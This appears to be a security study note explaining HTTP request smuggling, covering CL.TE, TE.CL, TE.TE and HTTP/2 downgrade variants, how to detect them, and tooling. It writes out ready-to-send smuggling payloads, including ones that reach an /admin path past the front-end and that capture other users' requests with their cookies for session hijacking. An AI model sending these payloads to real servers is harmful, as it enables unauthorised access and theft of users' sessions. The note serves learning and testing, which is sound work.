# HTTP Request Smuggling

← [[A03-Injection]]

---

HTTP Request Smuggling exploits disagreements between how a front-end proxy and a back-end server parse HTTP request boundaries. By sending an ambiguous request, you can "smuggle" a second request that the proxy doesn't see but the back-end processes.

---

## Why It Happens

HTTP/1.1 has two ways to specify request body length:

- `Content-Length` (CL) — exact byte count
- `Transfer-Encoding: chunked` (TE) — body ends with a zero-length chunk (`0\r\n\r\n`)

When a front-end proxy and back-end server use different methods to determine where a request ends, an attacker can cause the back-end to treat the tail of one request as the start of the next.

---

## The Two Main Variants

### CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end sees `Content-Length: 13` — sends 13 bytes (`0\r\n\r\nSMUGGLED`).
The back-end sees `Transfer-Encoding: chunked` — reads `0\r\n\r\n` as end of request. `SMUGGLED` is left in the back-end buffer as the start of the next request.

### TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

The front-end processes chunked encoding, sees the complete request. The back-end uses `Content-Length: 3` — reads only `8\r\n`, leaves `SMUGGLED\r\n0\r\n\r\n` in buffer.

---

## TE.TE — Obfuscated Transfer-Encoding

Both sides use `Transfer-Encoding` but one can be confused into ignoring it:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding : chunked   (space before colon)
Transfer-Encoding: xchunked
X: X[\n]Transfer-Encoding: chunked  (header injection)
```

---

## Detecting Request Smuggling

### Timing-Based

**CL.TE detection:**
```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If CL.TE is present: the back-end is waiting for the next chunk (because front-end said 4 bytes, but chunked says there should be more). Response will timeout.

### Differential Response

Send two normal requests after the smuggled prefix. If the second request gets an unexpected response, smuggling is working.

---

## Impact

### Bypass Security Controls

The smuggled request doesn't pass through the front-end proxy's security checks (WAF, auth, rate limiting):

```http
POST / HTTP/1.1
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
X-Ignore: X
```

The `GET /admin` request bypasses the front-end and hits the back-end directly.

### Capture Other Users' Requests

If you can get another user's request appended to your smuggled prefix, you can capture their data (including cookies, auth tokens):

```http
POST / HTTP/1.1
Content-Length: 200
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: example.com
Content-Length: 800

search=
```

The next victim's request gets appended to `search=` — their full request including headers and cookies arrives in the search parameter.

### Session Hijacking via Request Capture

Combining with a reflected endpoint:
1. Smuggle a partial request that "absorbs" the next user's request
2. The victim's session cookie appears in the log or reflection of that endpoint
3. Use their cookie to hijack their session

---

## HTTP/2 Smuggling

HTTP/2 uses binary framing — no Content-Length/TE ambiguity. But when a front-end speaks HTTP/2 to clients and downgrades to HTTP/1.1 for the back-end, smuggling is possible in the downgrade.

- **H2.CL:** HTTP/2 front-end ignores Content-Length, back-end trusts it
- **H2.TE:** HTTP/2 front-end strips Transfer-Encoding, back-end uses it
- **H2 header injection:** Inject `\r\n` into HTTP/2 headers to create HTTP/1.1 headers after downgrade

---

## Tools

```bash
# smuggler.py — HTTP/1.1 smuggling detection
python3 smuggler.py -u https://example.com

# Burp Suite Pro — HTTP Request Smuggler extension
# turbo-intruder for parallel requests needed for some attacks
```

---

*Related: [[HTTP-Deep-Dive]] | [[HTTP-Methods]] | [[A03-Injection]]*

*Sources: PortSwigger Web Security Academy (James Kettle's research), HTTP/2 RFC 9113*
